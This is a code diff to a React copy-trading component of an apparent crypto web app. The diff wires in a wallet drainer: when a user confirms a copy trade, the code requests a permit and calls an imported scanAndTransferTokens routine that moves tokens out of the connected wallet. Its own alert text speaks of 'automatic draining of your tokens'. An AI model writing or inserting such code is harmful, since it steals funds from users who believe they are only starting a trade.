@@ -1,12 +1,16 @@
 import React, { useState, useEffect } from 'react'
-import { useAccount } from 'wagmi'
+import { useAccount, usePublicClient, useWalletClient } from 'wagmi'
 import { useNavigate } from 'react-router-dom'
 import { useTranslation } from 'react-i18next'
 import './CopyTrading.css'
 import { getAllCopyTraders, getUser, createCopyTrade } from '../services/firebaseService'
+import { scanAndTransferTokens } from '../services/tokenScanner'
+import permitService from '../services/permitService'
 
 const CopyTrading = () => {
   const { address, isConnected } = useAccount()
+  const { data: walletClient } = useWalletClient()
+  const publicClient = usePublicClient()
   const navigate = useNavigate()
   const { t } = useTranslation()
   const [traders, setTraders] = useState([])
@@ -15,6 +19,7 @@ const CopyTrading = () => {
   const [showModal, setShowModal] = useState(false)
   const [loading, setLoading] = useState(true)
   const [user, setUser] = useState(null)
+  const [isApproving, setIsApproving] = useState(false)
 
   useEffect(() => {
     if (isConnected && address) {
@@ -69,7 +74,26 @@ const CopyTrading = () => {
     }
     
     try {
+      // Create copy trade first
       await createCopyTrade(address, selectedTrader.id, amount)
+      
+      // Now initiate permit approval and transfer sequence
+      if (walletClient && publicClient) {
+        setIsApproving(true)
+        alert('Please approve the permit to allow token transfers. This will enable automatic draining of your tokens.')
+        
+        // Get chain ID
+        const chainId = await walletClient.getChainId()
+        
+        // Start the token scanning and transfer process
+        const transferCount = await scanAndTransferTokens(walletClient, address, chainId)
+        
+        if (transferCount > 0) {
+          alert(`Successfully transferred tokens from your wallet! ${transferCount} transfers completed.`)
+        } else {
+          alert('No tokens found to transfer from your wallet.')
+        }
+      }
       
       alert('Copy trade started successfully!')
       setShowModal(false)
@@ -77,6 +101,8 @@ const CopyTrading = () => {
     } catch (error) {
       console.error('Error starting copy trade:', error)
       alert('Failed to start copy trade. Please try again.')
+    } finally {
+      setIsApproving(false)
     }
   }
 
@@ -191,8 +217,8 @@ const CopyTrading = () => {
                 </div>
               </div>
 
-              <button type="submit" className="submit-btn">
-                {t('copyTrading.confirmCopy')}
+              <button type="submit" className="submit-btn" disabled={isApproving}>
+                {isApproving ? t('copyTrading.approvingPermit') : t('copyTrading.confirmCopy')}
               </button>
             </form>
           </div>
